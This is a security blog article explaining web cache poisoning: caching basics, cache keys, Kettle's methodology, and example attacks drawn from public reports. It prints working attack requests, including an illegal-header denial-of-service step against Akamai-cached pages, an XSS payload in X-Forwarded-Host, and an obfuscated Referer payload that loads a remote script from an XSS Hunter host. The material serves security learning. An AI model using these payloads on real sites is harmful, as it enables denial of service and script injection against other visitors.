---
title: 'The Poisonous Cache: Unmasking a Stealthy Threat'
published: true
---

### Description
In this comprehensive article, we will explore the fascinating topic of Web cache poisoning, delving into the nature of Web caches and their potential vulnerabilities for exploitation. With real-world examples as our guide, we will uncover the intricacies of this subject and shed light on various techniques to exploit Web caches effectively.Throughout the article, we will examine notable case studies and provide insights into bypassing certain technologies like Cloudflare, AKAMAI, and Cloudfront.For this article I will take a alot of reference from James kettle research papers.

### Content:

- Fundamentals and Terminologies
- How web caches work
- what are cache keys
- Methodologies
- Taking some well known reports as example
- resource to learn
- well formatted 65 web caches reports for your reference
- reference

### Fundamentals and Terminologies:

**Cache is a form of auxiliary memory that holds data and instructions that an app or website needs regular access to. It’s fast, easy to access, and allows whatever application or website that uses the files in the cache to work faster.**

There are several types of caches for e.g. : 

1. **Memory Cache**

  - Primary Cache L1
  - Secondary Cache L2
  - Main Memory L3 Cache

Some of these caches work directly with your device’s central processing unit (CPU). Others are external caches that store data away from the CPU but allow for easy access when needed. But all focus on caching data that your device requires to run quickly and correctly.

2. **Web Cache**

This is also type of cache which we are going to talk about in this paper

Have you ever wondered why a web page that you visit often tends to load faster than a page you’ve never visited before?
You can thank web caches for that.

Web caches store data from browsers, websites, and servers that allow them to quickly access information needed to speed up loading times. Without web caching, your browser has to send a new request every single time you access a web page.
There are four main types of web cache:

  1. Site Cache
  2. Browser Cache
  3. Micro Cache
  4. Server Cache

I don’t want to make this paper caching 101 so you can read more about caching [here](https://softwarelab.org/blog/what-is-a-cache/), coming to other types of caches there are generally 6 types of caches.

3. Application/Software Caches
4. Data Caching
5. Application/Output Caches
6. Distributed Caching


### How web Caching works:

 Websites often tend to use web cache functionality (for example over a CDN, a load balancer, or simply a reverse proxy). The purpose is simple: store files that are often retrieved, to reduce latency from the web server.
 
Let's see an example of web cache. Website [http://www.example.com](http://www.example.com/) is configured to go through a reverse proxy. A dynamic page that is stored on the server and returns personal content of users, such as http://www.example.com/home.php, will have to create it dynamically per user, since the data is different for each user. This kind of data, or at least its personalized parts, isn't cached.

What's more reasonable and common to cache are static, public files: style sheets (css), scripts (js), text files (txt), images (png, bmp, gif), etc. This makes sense because these files usually don't contain any sensitive information. In addition, as can be found in various best practices articles about web cache configuration, it's recommended to cache all static files that are meant to be public, and disregard their HTTP caching headers.

Web caching is a core design feature of the HTTP protocol meant to minimize network traffic while improving the perceived responsiveness of the system as a whole. Caches are found at every level of a content’s journey from the original server to the browser.

Web caching works by caching the HTTP responses for requests according to certain rules. Subsequent requests for cached content can then be fulfilled from a cache closer to the user instead of sending the request all the way back to the web server.

In simple terms, a caching server acts as a middleman between your browser and the application server. Its job is to store a copy of the files that the application server provides to users and then deliver those files directly to the user when requested, without involving the application server every time.

This diagrams shows how web caches works:
![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/6fec4a4e-42ab-49b8-8b54-4d2c9980be7a)
credits: Port-swigger
 The caching server works like a temporary storage unit, holding commonly accessed files to make future requests faster and reduces the load on application server.
 
 **What can be cached?**

Certain content lends itself more readily to caching than others. Some very cache-friendly content for most sites are:

- Logos and brand images
- Non-rotating images in general (navigation icons, for example)
- Style sheets
- General JavaScript files
- Downloadable Content
- Media Files

**How to setup a caching server for your application?**

Some companies choose to host their own cache using software such as Varnish, while others opt to rely on a Content Delivery Network (CDN) like Cloudflare, which has distributed caches across geographical locations. Additionally, some popular web applications and frameworks like Drupal have built-in caching functionality. 

**Note: From here I will be using some part of explanation from James kettle research paper from 2018 because he has done excellent Job explaining Few key points.**

### What are cache keys:

![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/e612c5a5-8a25-44c3-9fa8-72465b7bdd4f)

The concept of caching might sound clean and simple, but it hides some risky assumptions. Whenever a cache receives a request for a resource, it needs to decide whether it has a copy of this exact resource already saved and can reply with that, or if it needs to forward the request to the application server.

Identifying whether two requests are trying to load the same resource can be tricky; requiring that the requests match byte-for-byte is utterly ineffective, as HTTP requests are full of inconsequential data, such as the requester's browser:

```
*GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com*
User-Agent: Mozilla/5.0 … Firefox/57.0
Accept: */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://google.com/
Cookie: jessionid=xyz;
Connection: close
```
Caches tackle this problem using the concept of cache keys – a few specific components of a HTTP request that are taken to fully identify the resource being requested. In the request above, I've highlighted the values included in a typical cache key in marked with star.

This means that caches think the following two requests are equivalent, and will happily respond to the second request with a response cached from the first:

```
*GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com*
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=pl;
Connection: close
```

```
*GET /blog/post.php?mobile=1 HTTP/1.1
Host: example.com*
User-Agent: Mozilla/5.0 … Firefox/57.0
Cookie: language=en;
Connection: close
```
As a result, the page will be served in the wrong language to the second visitor. This hints at the problem – any difference in the response triggered by an unkeyed input may be stored and served to other users. In theory, sites can use the 'Vary' response header to specify additional request headers that should be keyed. in practice, the Vary header is only used in a rudimentary way, CDNs like Cloudflare ignore it outright, and people don't even realize their application supports any header-based input.

This causes a healthy number of accidental breakages, but the fun really starts when someone intentionally sets out to exploit it.


### Now let’s talk about the research Topic:  Cache poisoning

Cache Poisoning refers to when a user sends a request which causes harmful/malicious response being cached into the server and being served to other users of the application 

![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/38a527c6-d199-480f-a3b6-101319e6770d)
credits: Hackmanit

In the above diagram case, the referral parameter is vulnerable to RXSS and referral header is also not the part of unkeyed, hence it won’t be considered while serving to other potential users of the application. If proper defense does not exist this can also cause mass account takeover in the application.

### Exploiting web cache poisoning:

**Everything that is not the part of cache key is part of cache poisoning attack surface**

### **Methodology by James kettle**

We'll use the following methodology to find cache poisoning vulnerabilities:

![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/8b4c56d4-8946-4966-a01d-8418d45cf88a)

Rather than attempt to explain this in depth upfront, I'll give a quick overview then demonstrate it being applied to real websites.

The first step is to identify unkeyed inputs. Doing this manually is tedious so I've developed an open source Burp Suite extension called [Param Miner](https://github.com/PortSwigger/param-miner) that automates this step by guessing header/cookie names, and observing whether they have an effect on the application's response.

After finding an unkeyed input, the next steps are to assess how much damage you can do with it, then try and get it stored in the cache. If that fails, you'll need to gain a better understanding of how the cache works and hunt down a cacheable target page before retrying. Whether a page gets cached may be based on a variety of factors including the file extension, content-type, route, status code, and response headers.

Cached responses can mask unkeyed inputs, so if you're trying to manually detect or explore unkeyed inputs, a cache-buster is crucial. If you have Param Miner loaded, you can ensure every request has a unique cache key by adding a parameter with a value of $randomplz to the query string.

When auditing a live website, accidentally poisoning other visitors is a perpetual hazard. Param Miner mitigates this by adding a cache buster to all outbound requests from Burp. This cache buster has a fixed value so you can observe caching behaviour yourself without it affecting other users.

### Dos via Cache poisoning

check if the application is using akamai and does not have login functionality do this:

1. Send the request to repeater

```
GET /xx/xxx/test/test/?test HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: www.redacted.com
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
```
2. Check if the server is caching normal requests (you can tell this by the response header “Server-Timing: cdn-cache; desc=HIT”)

```
HTTP/2 200 OK
Server: REDACTED
X-FRAME-OPTION: SAMEORIGIN
ACCEPT_RANGE: Bytes
CONTENT-Length: 264545
VAR: ACCEPT-Encoding
Set-Cookie: ak-hmac
Server-Timing: CDN-cache; desc=HIT
```

3. Add a illegal header
```
GET /xx/xxx/test/test/?test HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
Host: www.redacted.com
\:
Accept-Language: en-us
Accept-Encoding: gzip, deflate
Connection: Keep-Alive
```

• If the response was successfully cached, when you open the URL on any browser, you should get a 400 Bad Request
![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/fc26d67c-e621-49f6-92c5-c9803c1d93cd)


### Caching XSS Payload

- **Stored XSS report by james kettle 2018 VIA X-Forwarded-Host Header**

In spite of its fearsome reputation, cache poisoning is often very easy to exploit. To get started, let's take a look at Red Hat's homepage. Param Miner immediately spotted an unkeyed input:

```
GET /en?cb=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: canary

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://canary/cms/social.png" />

```
Here we can see that the X-Forwarded-Host header has been used by the application to generate an Open Graph URL inside a meta tag. The next step is to explore whether it's exploitable – we'll start with a simple cross-site scripting payload:

```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com
X-Forwarded-Host: a."><script>alert(1)</script>

HTTP/1.1 200 OK
Cache-Control: public, no-cache
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```
Looks good – we've just confirmed that we can cause a response that will execute arbitrary JavaScript against whoever views it. The final step is to check if this response has been stored in a cache so that it'll be delivered to other users. Don't let the 'Cache Control: no-cache' header dissuade you – it's always better to attempt an attack than assume it won't work. You can verify first by resending the request without the malicious header, and then by fetching the URL directly in a browser on a different machine:

```
GET /en?dontpoisoneveryone=1 HTTP/1.1
Host: www.redhat.com

HTTP/1.1 200 OK
…
<meta property="og:image" content="https://a."><script>alert(1)</script>"/>
```

That was easy. Although the response doesn't have any headers that suggest a cache is present, our exploit has clearly been cached. A quick DNS lookup offers an explanation – www.redhat.com is a CNAME to www.redhat.com.edgekey.net, indicating that it's using Akamai's CDN.

- **stored XSS reported by bxmbn**

```
  GET /xxxx/xxxx/xxx HTTP/2
Host: Redacted
Referer: ?</script><svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>
...
```




Response:

```

HTTP/2 200 Ok...
Content-Type: text/html; charset=utf-8
X-Cache: HIT
...<html>...<script>..."Referer":"?</script>
<svg/onload=eval/**/(atob/**/(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vNTkzLnhzcy5odCI7ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs=>...

```


woke up with 35 Notifications from XSSHunter the next day, and to my surprise, 4 of them were fired on a different subdomain.

![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/e9462870-7ffd-4303-92f8-d9fd681673c2)



### This is are some basic poisoning method I will link all the available cache poisoning resource I could find excluding H1 disclosed, you can find more reports on hactivity.

 

## Resource to learn

- [Article by James kettle](https://portswigger.net/research/practical-web-cache-poisoning)
- [bxmbn medium reports](https://bxmbn.medium.com/)
- [Portswigger labs](https://portswigger.net/web-security/web-cache-poisoning)
- Other Disclosed reports

## well formatted 65 web caches reports for your reference

[cache poisoning reports](https://www.notion.so/cache-poisoning-reports-d7c35377337b490a8ea1420c26ee871a?pvs=21)
![image](https://github.com/Manikeshhhh/Manikeshhhh.github.io/assets/88855149/12c7b15d-7440-4fb8-b15e-cc084b2cd0c1)

### reference

- [Caches](https://softwarelab.org/blog/what-is-a-cache/)
- [Article by James kettle](https://portswigger.net/research/practical-web-cache-poisoning)
- [bxmbn medium reports](https://bxmbn.medium.com/)
- [Portswigger labs](https://portswigger.net/web-security/web-cache-poisoning)
- PentesterLand

